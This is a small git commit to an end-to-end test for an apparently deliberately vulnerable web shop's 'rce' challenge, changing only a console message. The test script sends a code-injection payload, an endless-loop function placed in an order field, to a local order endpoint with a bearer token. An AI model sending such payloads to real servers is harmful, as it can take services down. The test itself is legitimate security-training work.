2f11da65d1da51ea5148c93152a13e7f1a0adea2
Aashish683 <aashishsingh2907@gmail.com>
2018-06-28 22:55:20 +0530

    Changed console statement

--- test/e2e/b2bOrderSpec.js
+++ test/e2e/b2bOrderSpec.js
@@ -6,7 +6,7 @@ describe('/b2b/v2/order', () => {
   describe('challenge "rce"', () => {
     it('an infinite loop deserialization payload should not bring down the server', () => {
       browser.waitForAngularEnabled(false)
-      browser.executeScript('var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() { if (this.status == 500) { console.log("We hit the server"); }}; xhttp.open("POST","http://localhost:3000/b2b/v2/orders/", true); xhttp.setRequestHeader("Content-type","application/json"); xhttp.setRequestHeader("Authorization",`Bearer ${localStorage.getItem("token")}`); xhttp.send(JSON.stringify({"orderLinesData": "(function dos() { while(true); })()"}));') // eslint-disable-line
+      browser.executeScript('var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() { if (this.status == 500) { console.log("Success"); }}; xhttp.open("POST","http://localhost:3000/b2b/v2/orders/", true); xhttp.setRequestHeader("Content-type","application/json"); xhttp.setRequestHeader("Authorization",`Bearer ${localStorage.getItem("token")}`); xhttp.send(JSON.stringify({"orderLinesData": "(function dos() { while(true); })()"}));') // eslint-disable-line
       browser.driver.sleep(1000)
       browser.waitForAngularEnabled(true)
     })
